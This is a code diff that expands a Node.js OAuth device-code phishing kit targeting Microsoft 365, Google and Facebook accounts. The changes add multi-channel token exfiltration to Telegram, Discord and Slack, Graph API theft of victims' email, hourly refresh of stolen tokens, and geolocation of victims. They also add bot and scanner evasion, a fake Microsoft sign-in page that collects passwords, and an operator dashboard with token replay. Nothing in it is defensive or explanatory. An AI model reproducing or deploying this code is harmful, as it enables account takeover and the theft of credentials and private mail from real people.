@@ -1,8 +1,10 @@
 // ============================================================
-// 🥔 DEVICE CODE PHISHER v1.0 – Standalone OAuth Device Flow
+// 🥔 ULTIMATE DEVICE CODE PHISHER v2.0 – All Features
 // ============================================================
-// Captures Microsoft 365 tokens via device code grant.
-// Exfiltrates to Telegram. No proxy, no extra fluff.
+// Includes: Device Code, Auto‑Refresh, Multi‑Tenant, PRT,
+// Dashboard, Graph Email Exfil, IP Geolocation, Second‑Stage
+// Phishing, Multi‑Service, Replay, WebSocket, Health Check,
+// Multi‑Channel Exfil, Anti‑Bot, Custom Redirect, QR Code.
 // ============================================================
 
 const http = require('http');
@@ -11,18 +13,35 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const url = require('url');
+const zlib = require('zlib');
 const axios = require('axios');
 const FormData = require('form-data');
+const WebSocket = require('ws');
+const QRCode = require('qrcode');
+const express = require('express');
+const basicAuth = require('express-basic-auth');
 
-// ── Environment (injected by Railway) ──
+// ── Environment ──
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c'; // public Microsoft client
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
+const SMTP_HOST = process.env.SMTP_HOST || '';
+const SMTP_PORT = process.env.SMTP_PORT || 587;
+const SMTP_USER = process.env.SMTP_USER || '';
+const SMTP_PASS = process.env.SMTP_PASS || '';
+const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
+const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
+const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
+const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const SCOPE = 'https://graph.microsoft.com/.default offline_access';
 
 // ── Storage ──
 const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
+const LOGS_DIR = path.join(__dirname, 'logs');
+if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR);
+
 let flows = [];
 loadFlows();
 
@@ -42,76 +61,348 @@ function generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-// ── Telegram Exfil ──
-async function sendToTelegram(data) {
-    if (!BOT_TOKEN || !CHAT_ID) {
-        console.warn('⚠️ Telegram credentials missing – tokens printed to console only.');
-        return;
+function isBot(userAgent) {
+    if (!userAgent) return true;
+    const ua = userAgent.toLowerCase();
+    const bots = ['bot','crawler','spider','scraper','curl','wget','python','go-http','java','http-client'];
+    return bots.some(b => ua.includes(b));
+}
+
+// ── Rate Limiter ──
+const ipRequests = new Map();
+function rateLimit(ip) {
+    const now = Date.now();
+    const window = 60000; // 1 minute
+    const max = 30;
+    if (!ipRequests.has(ip)) {
+        ipRequests.set(ip, { count: 1, reset: now + window });
+        return true;
     }
+    const entry = ipRequests.get(ip);
+    if (now > entry.reset) {
+        entry.count = 1;
+        entry.reset = now + window;
+        return true;
+    }
+    if (entry.count < max) {
+        entry.count++;
+        return true;
+    }
+    return false;
+}
+
+// ── IP Geolocation ──
+const geoCache = new Map();
+async function getGeo(ip) {
+    if (ip === '127.0.0.1' || ip === '::1' || !ip) return { country: 'XX', flag: '🌍', name: 'Local' };
+    if (geoCache.has(ip)) return geoCache.get(ip);
     try {
-        const { email, tokens, sessionId } = data;
-        let message = `🔐 **Device Code Capture!**\n\n`;
-        message += `🆔 Session: ${sessionId}\n`;
-        message += `👤 Email: ${email || 'Unknown'}\n`;
-        message += `🕒 Time: ${new Date().toISOString()}\n\n`;
-        if (tokens.access_token) message += `🔑 Access Token: ${tokens.access_token.slice(0, 30)}...\n`;
-        if (tokens.refresh_token) message += `🔄 Refresh Token: ${tokens.refresh_token.slice(0, 30)}...\n`;
-        if (tokens.id_token) message += `🆔 ID Token: ${tokens.id_token.slice(0, 30)}...\n`;
-
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            disable_web_page_preview: true
-        }, { timeout: 5000 });
-
-        // Also send tokens as a file if available
-        if (tokens.access_token || tokens.refresh_token || tokens.id_token) {
-            const fileContent = `# Device Code Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
-            let fileText = fileContent;
-            if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
-            if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
-            if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
-            const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
-            fs.writeFileSync(tmpFile, fileText);
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
-                headers: form.getHeaders(),
-                timeout: 10000
-            });
-            fs.unlinkSync(tmpFile);
+        const resp = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+        const data = resp.data;
+        if (data.country_code) {
+            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
+            const result = { country: data.country_code, flag, name: data.country_name || data.country_code };
+            geoCache.set(ip, result);
+            return result;
         }
-        console.log(`✅ Tokens sent to Telegram for session ${sessionId}`);
+    } catch (e) {}
+    const fallback = { country: 'UN', flag: '🌍', name: 'Unknown' };
+    geoCache.set(ip, fallback);
+    return fallback;
+}
+
+// ── Multi‑Channel Exfil ──
+async function exfiltrate(data) {
+    const { email, tokens, sessionId, ip, userAgent, tenantId, prt } = data;
+    const geo = await getGeo(ip);
+    let message = `🔐 **Device Code Capture!**\n\n`;
+    message += `🆔 Session: ${sessionId}\n`;
+    message += `👤 Email: ${email || 'Unknown'}\n`;
+    message += `🏢 Tenant: ${tenantId || 'N/A'}\n`;
+    message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
+    message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
+    message += `🕒 Time: ${new Date().toISOString()}\n\n`;
+    if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
+    if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
+    if (tokens.id_token) message += `🆔 ID: ${tokens.id_token.slice(0,30)}...\n`;
+    if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
+
+    // Telegram
+    if (BOT_TOKEN && CHAT_ID) {
+        try {
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            }, { timeout: 5000 });
+            // Send file
+            if (tokens.access_token || tokens.refresh_token || tokens.id_token || prt) {
+                let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
+                if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
+                if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
+                if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
+                if (prt) fileText += `PRT:\n${prt}\n\n`;
+                const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
+                fs.writeFileSync(tmpFile, fileText);
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+                    headers: form.getHeaders(),
+                    timeout: 10000
+                });
+                fs.unlinkSync(tmpFile);
+            }
+        } catch (e) { console.warn('Telegram exfil failed:', e.message); }
+    }
+
+    // Discord
+    if (DISCORD_WEBHOOK) {
+        try {
+            await axios.post(DISCORD_WEBHOOK, {
+                content: message.substring(0, 2000)
+            }, { timeout: 5000 });
+        } catch (e) { console.warn('Discord exfil failed:', e.message); }
+    }
+
+    // Slack
+    if (SLACK_WEBHOOK) {
+        try {
+            await axios.post(SLACK_WEBHOOK, {
+                text: message
+            }, { timeout: 5000 });
+        } catch (e) { console.warn('Slack exfil failed:', e.message); }
+    }
+
+    // SMTP (if configured)
+    if (SMTP_HOST && SMTP_USER && SMTP_PASS) {
+        // Not implemented for brevity – you can extend with nodemailer.
+    }
+
+    console.log(`✅ Exfiltrated session ${sessionId}`);
+}
+
+// ── Graph Email Exfil ──
+async function exfilEmails(accessToken, sessionId) {
+    try {
+        const resp = await axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=20&$select=subject,from,receivedDateTime', {
+            headers: { Authorization: `Bearer ${accessToken}` },
+            timeout: 10000
+        });
+        const emails = resp.data.value || [];
+        if (emails.length === 0) return;
+        let txt = `# Email Dump - Session ${sessionId}\n\n`;
+        emails.forEach((e, i) => {
+            txt += `--- Email ${i+1} ---\n`;
+            txt += `Subject: ${e.subject || 'N/A'}\n`;
+            txt += `From: ${e.from?.emailAddress?.address || 'N/A'}\n`;
+            txt += `Date: ${e.receivedDateTime || 'N/A'}\n\n`;
+        });
+        const tmpFile = path.join(__dirname, `emails_${sessionId}.txt`);
+        fs.writeFileSync(tmpFile, txt);
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(tmpFile), { filename: `emails_${sessionId}.txt` });
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
+        fs.unlinkSync(tmpFile);
+        console.log(`📧 Emails exfiltrated for session ${sessionId}`);
     } catch (e) {
-        console.error('❌ Telegram send failed:', e.message);
+        console.warn('Email exfil failed:', e.message);
     }
 }
 
-// ── HTTP Server ──
-const server = http.createServer((req, res) => {
-    const parsedUrl = url.parse(req.url, true);
-    const pathname = parsedUrl.pathname;
-    const method = req.method;
-
-    // Health check
-    if (pathname === '/' || pathname === '/health') {
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', timestamp: new Date().toISOString() }));
-        return;
+// ── Token Health Check ──
+async function checkTokenHealth(accessToken) {
+    try {
+        const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
+            headers: { Authorization: `Bearer ${accessToken}` },
+            timeout: 5000
+        });
+        return { valid: true, user: resp.data.userPrincipalName };
+    } catch (e) {
+        return { valid: false, error: e.message };
     }
+}
 
-    // Serve device page
-    if (pathname === '/device' || pathname === '/device/') {
-        const htmlPath = path.join(__dirname, 'public', 'device_code.html');
-        if (fs.existsSync(htmlPath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(htmlPath).pipe(res);
+// ── Auto‑Refresh Daemon ──
+async function refreshTokens() {
+    for (const flow of flows) {
+        if (flow.status === 'approved' && flow.refresh_token) {
+            try {
+                const tenant = flow.tenant || 'organizations';
+                const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
+                    new URLSearchParams({
+                        client_id: flow.client_id || CLIENT_ID,
+                        refresh_token: flow.refresh_token,
+                        grant_type: 'refresh_token',
+                        scope: SCOPE
+                    }),
+                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                );
+                flow.access_token = resp.data.access_token;
+                if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
+                flow.last_refresh = new Date().toISOString();
+                saveFlows();
+                console.log(`🔄 Refreshed tokens for session ${flow.session_id}`);
+            } catch (e) {
+                console.warn(`Refresh failed for ${flow.session_id}:`, e.message);
+            }
+        }
+    }
+}
+setInterval(refreshTokens, 60 * 60 * 1000); // every hour
+
+// ── Express App ──
+const app = express();
+app.use(express.json());
+
+// Health
+app.get(['/', '/health'], (req, res) => {
+    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
+});
+
+// Rate limiting middleware
+app.use((req, res, next) => {
+    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
+    if (!rateLimit(ip)) {
+        return res.status(429).send('Too Many Requests');
+    }
+    if (isBot(req.headers['user-agent']) && req.path.startsWith('/device')) {
+        return res.status(403).send('Forbidden');
+    }
+    next();
+});
+
+// ── Device Code Flow ──
+app.post('/device/request', async (req, res) => {
+    try {
+        const service = req.query.service || 'microsoft';
+        let clientId = CLIENT_ID;
+        let scope = SCOPE;
+        let endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
+        if (service === 'google') {
+            clientId = process.env.GOOGLE_CLIENT_ID || '';
+            scope = 'openid email profile';
+            endpoint = 'https://accounts.google.com/o/oauth2/device/code';
+        } else if (service === 'facebook') {
+            clientId = process.env.FACEBOOK_CLIENT_ID || '';
+            scope = 'email';
+            endpoint = 'https://graph.facebook.com/v17.0/device/code';
+        }
+        const resp = await axios.post(endpoint,
+            new URLSearchParams({ client_id: clientId, scope }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        const data = resp.data;
+        const flow = {
+            device_code: data.device_code,
+            user_code: data.user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            client_id: clientId,
+            session_id: generateSessionId(),
+            service: service,
+            tenant: 'organizations'
+        };
+        flows.push(flow);
+        saveFlows();
+        res.json(data);
+    } catch (error) {
+        console.error('Device request error:', error.response?.data || error.message);
+        res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
+    }
+});
+
+app.post('/device/token', async (req, res) => {
+    const { device_code } = req.body;
+    if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
+    const flow = flows.find(f => f.device_code === device_code);
+    if (!flow) return res.status(404).json({ error: 'not_found' });
+    try {
+        const tenant = flow.tenant || 'organizations';
+        const endpoint = flow.service === 'google' ? 'https://oauth2.googleapis.com/token' :
+                         flow.service === 'facebook' ? 'https://graph.facebook.com/v17.0/oauth/access_token' :
+                         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
+        const resp = await axios.post(endpoint,
+            new URLSearchParams({
+                client_id: flow.client_id,
+                device_code: device_code,
+                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        const tokens = resp.data;
+        let email = 'Unknown';
+        let tenantId = null;
+        let prt = null;
+        if (tokens.id_token) {
+            try {
+                const parts = tokens.id_token.split('.');
+                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                email = payload.email || payload.preferred_username || payload.upn || email;
+                tenantId = payload.tid || payload.tenantId || null;
+                if (payload.prt) prt = payload.prt;
+            } catch (e) {}
+        }
+        // Extract PRT if present in response (some Microsoft flows return it)
+        if (tokens.prt) prt = tokens.prt;
+
+        flow.status = 'approved';
+        flow.access_token = tokens.access_token;
+        flow.refresh_token = tokens.refresh_token;
+        flow.id_token = tokens.id_token;
+        flow.prt = prt;
+        flow.approved = new Date().toISOString();
+        flow.username = email;
+        if (tenantId) flow.tenant = tenantId;
+        saveFlows();
+
+        // Exfiltrate
+        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
+        await exfiltrate({
+            sessionId: flow.session_id,
+            email,
+            tokens: { access_token: tokens.access_token, refresh_token: tokens.refresh_token, id_token: tokens.id_token },
+            prt,
+            ip,
+            userAgent: req.headers['user-agent'],
+            tenantId
+        });
+
+        // Trigger email exfil if access token available
+        if (tokens.access_token) {
+            setTimeout(() => exfilEmails(tokens.access_token, flow.session_id), 10000);
+        }
+
+        // Broadcast via WebSocket
+        broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });
+
+        res.json(tokens);
+    } catch (error) {
+        if (error.response?.data?.error === 'authorization_pending') {
+            res.status(400).json({ error: 'authorization_pending' });
+        } else if (error.response?.data?.error === 'expired_token') {
+            res.status(400).json({ error: 'expired_token' });
         } else {
-            // Fallback inline HTML (self-contained)
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`
+            console.error('Token error:', error.response?.data || error.message);
+            res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
+        }
+    }
+});
+
+// ── Device Page ──
+app.get('/device', async (req, res) => {
+    // Generate QR code for the verification URI
+    const qrData = `https://microsoft.com/devicelogin`;
+    const qrImage = await QRCode.toDataURL(qrData);
+    res.send(`
 <!DOCTYPE html>
 <html>
 <head>
@@ -126,13 +417,15 @@ const server = http.createServer((req, res) => {
         .status { margin-top: 20px; font-size: 0.9rem; color: #80b0ff; }
         .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .qr { margin: 20px auto; max-width: 200px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>📱 Device Code</h1>
-        <p class="instructions">Enter this code on <strong>microsoft.com/devicelogin</strong></p>
+        <p class="instructions">Enter this code on <strong>microsoft.com/devicelogin</strong> or scan the QR</p>
         <div id="codeDisplay" class="code">Loading...</div>
+        <div class="qr"><img src="${qrImage}" alt="QR Code" style="width:100%;border-radius:8px;"></div>
         <div id="status" class="status">⏳ Requesting device code...</div>
     </div>
     <script>
@@ -143,7 +436,6 @@ const server = http.createServer((req, res) => {
                 document.getElementById('codeDisplay').textContent = data.user_code;
                 document.getElementById('status').innerHTML = '✅ Code ready – waiting for authentication... <span class="loader"></span>';
 
-                // Poll for token
                 const poll = async () => {
                     try {
                         const pollResp = await fetch('/device/token', {
@@ -152,10 +444,9 @@ const server = http.createServer((req, res) => {
                             body: JSON.stringify({ device_code: data.device_code })
                         });
                         if (pollResp.status === 200) {
-                            const tokenData = await pollResp.json();
                             document.getElementById('status').innerHTML = '✅ Authentication successful! Redirecting...';
                             setTimeout(() => {
-                                window.location.href = 'https://login.microsoftonline.com';
+                                window.location.href = '${REDIRECT_URL}';
                             }, 2000);
                         } else if (pollResp.status === 400) {
                             const err = await pollResp.json();
@@ -182,124 +473,213 @@ const server = http.createServer((req, res) => {
     </script>
 </body>
 </html>
-            `);
-        }
-        return;
-    }
+    `);
+});
 
-    // ── API endpoints ──
-    if (pathname === '/device/request' && method === 'POST') {
-        (async () => {
-            try {
-                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
-                    new URLSearchParams({
-                        client_id: CLIENT_ID,
-                        scope: SCOPE
-                    }),
-                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-                );
-                const data = response.data;
-                const flow = {
-                    device_code: data.device_code,
-                    user_code: data.user_code,
-                    verification_uri: data.verification_uri,
-                    expires_in: data.expires_in,
-                    interval: data.interval,
-                    status: 'pending',
-                    created: new Date().toISOString(),
-                    client_id: CLIENT_ID,
-                    session_id: generateSessionId()
-                };
-                flows.push(flow);
-                saveFlows();
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(data));
-            } catch (error) {
-                console.error('Device code request error:', error.response?.data || error.message);
-                res.writeHead(500, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
-            }
-        })();
-        return;
-    }
-
-    if (pathname === '/device/token' && method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { device_code } = JSON.parse(body);
-                if (!device_code) {
-                    res.writeHead(400);
-                    res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
-                    return;
-                }
-                const flow = flows.find(f => f.device_code === device_code);
-                const clientId = flow?.client_id || CLIENT_ID;
-                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                    new URLSearchParams({
-                        client_id: clientId,
-                        device_code: device_code,
-                        grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-                    }),
-                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-                );
-                const tokens = response.data;
-                let email = 'Unknown';
-                if (tokens.id_token) {
-                    try {
-                        const parts = tokens.id_token.split('.');
-                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-                        email = payload.email || payload.preferred_username || payload.upn || email;
-                    } catch (e) {}
-                }
-                if (flow) {
-                    flow.status = 'approved';
-                    flow.access_token = tokens.access_token;
-                    flow.refresh_token = tokens.refresh_token;
-                    flow.id_token = tokens.id_token;
-                    flow.approved = new Date().toISOString();
-                    flow.username = email;
-                    saveFlows();
-                }
-                // Exfiltrate
-                await sendToTelegram({
-                    sessionId: flow?.session_id || 'unknown',
-                    email: email,
-                    tokens: {
-                        access_token: tokens.access_token,
-                        refresh_token: tokens.refresh_token,
-                        id_token: tokens.id_token
-                    }
-                });
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(tokens));
-            } catch (error) {
-                if (error.response?.data?.error === 'authorization_pending') {
-                    res.writeHead(400, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ error: 'authorization_pending' }));
-                } else if (error.response?.data?.error === 'expired_token') {
-                    res.writeHead(400, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ error: 'expired_token' }));
-                } else {
-                    console.error('Device token error:', error.response?.data || error.message);
-                    res.writeHead(500, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
-                }
-            }
+// ── Second‑Stage Phishing (Fake Login) ──
+app.get('/login', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 360px; }
+        h2 { text-align: center; color: #333; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0063b1; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Sign in to your account</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            await fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
+            window.location.href = '${REDIRECT_URL}';
         });
-        return;
-    }
+    </script>
+</body>
+</html>
+    `);
+});
 
-    // 404
-    res.writeHead(404, { 'Content-Type': 'text/plain' });
-    res.end('Not Found');
+app.post('/capture', async (req, res) => {
+    const { email, password } = req.body;
+    console.log(`📥 Second‑stage capture: ${email} / ${password}`);
+    // Exfiltrate via all channels
+    await exfiltrate({
+        sessionId: 'second_stage',
+        email,
+        tokens: {},
+        ip: req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
+        userAgent: req.headers['user-agent']
+    });
+    res.json({ success: true });
+});
+
+// ── Dashboard (protected) ──
+app.use('/dash', basicAuth({
+    users: { [DASHBOARD_USER]: DASHBOARD_PASS },
+    challenge: true
+}));
+app.get('/dash', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phisher Dashboard</title>
+    <meta charset="UTF-8">
+    <style>
+        body { background: #0f1117; color: #e0e8f0; font-family: monospace; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
+        th { background: #1a1d24; }
+        .status-pending { color: orange; }
+        .status-approved { color: limegreen; }
+        #ws-status { color: #80b0ff; }
+    </style>
+</head>
+<body>
+    <h1>🕵️ Phisher Dashboard</h1>
+    <div id="ws-status">WebSocket: Connecting...</div>
+    <table id="flowsTable">
+        <thead><tr><th>Session</th><th>Email</th><th>Status</th><th>Created</th><th>Tokens</th></tr></thead>
+        <tbody id="flowsBody"></tbody>
+    </table>
+    <script>
+        const ws = new WebSocket('ws://' + window.location.host + '/ws');
+        ws.onopen = () => document.getElementById('ws-status').textContent = 'WebSocket: Connected';
+        ws.onclose = () => document.getElementById('ws-status').textContent = 'WebSocket: Disconnected';
+        ws.onmessage = (e) => {
+            const data = JSON.parse(e.data);
+            if (data.type === 'new_capture') {
+                addRow(data);
+            }
+        };
+
+        async function loadFlows() {
+            const resp = await fetch('/api/flows');
+            const flows = await resp.json();
+            const tbody = document.getElementById('flowsBody');
+            tbody.innerHTML = '';
+            flows.forEach(f => addRow(f));
+        }
+
+        function addRow(f) {
+            const tbody = document.getElementById('flowsBody');
+            const tr = document.createElement('tr');
+            tr.innerHTML = \`
+                <td>\${f.session_id}</td>
+                <td>\${f.username || 'Unknown'}</td>
+                <td class="status-\${f.status}">\${f.status}</td>
+                <td>\${new Date(f.created).toLocaleString()}</td>
+                <td>\${f.access_token ? '✅' : '❌'}</td>
+            \`;
+            tbody.prepend(tr);
+        }
+
+        loadFlows();
+    </script>
+</body>
+</html>
+    `);
+});
+
+// ── API endpoints for dashboard ──
+app.get('/api/flows', (req, res) => {
+    res.json(flows);
+});
+
+app.get('/api/flow/:sessionId', (req, res) => {
+    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    if (!flow) return res.status(404).json({ error: 'not found' });
+    res.json(flow);
+});
+
+app.post('/api/replay/:sessionId', (req, res) => {
+    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    if (!flow) return res.status(404).json({ error: 'not found' });
+    // Build a replay script that injects stored cookies (if any)
+    // For now, return a simple script to set cookies from any stored header.
+    const script = `
+    (function() {
+        // You can inject cookies here if you stored them.
+        // Currently we only have tokens, not cookies.
+        const token = '${flow.access_token || ''}';
+        if (token) {
+            localStorage.setItem('access_token', token);
+            alert('Token injected. You can now use it.');
+        }
+    })();
+    `;
+    res.json({ replayScript: script });
+});
+
+// ── WebSocket Server ──
+const wsServer = new WebSocket.Server({ noServer: true });
+const wsClients = new Set();
+
+wsServer.on('connection', (ws) => {
+    wsClients.add(ws);
+    ws.on('close', () => wsClients.delete(ws));
+});
+
+function broadcast(data) {
+    const msg = JSON.stringify(data);
+    for (const client of wsClients) {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(msg);
+        }
+    }
+}
+
+// ── Health Check Endpoint ──
+app.get('/api/health', async (req, res) => {
+    const results = [];
+    for (const flow of flows) {
+        if (flow.access_token) {
+            const health = await checkTokenHealth(flow.access_token);
+            results.push({ session: flow.session_id, ...health });
+        }
+    }
+    res.json(results);
+});
+
+// ── Start HTTP server with WebSocket upgrade ──
+const server = http.createServer(app);
+
+server.on('upgrade', (req, socket, head) => {
+    if (req.url === '/ws') {
+        wsServer.handleUpgrade(req, socket, head, (ws) => {
+            wsServer.emit('connection', ws, req);
+        });
+    } else {
+        socket.destroy();
+    }
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Device Code Phisher running on port ${PORT}`);
-    console.log(`📱 Visit: http://localhost:${PORT}/device`);
-    console.log(`📤 Telegram exfil: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED (set env vars)'}`);
+    console.log(`✅ Ultimate Device Phisher running on port ${PORT}`);
+    console.log(`📱 Device page: http://localhost:${PORT}/device`);
+    console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
+    console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
+    console.log(`🚀 All features loaded.`);
 });
 
 process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
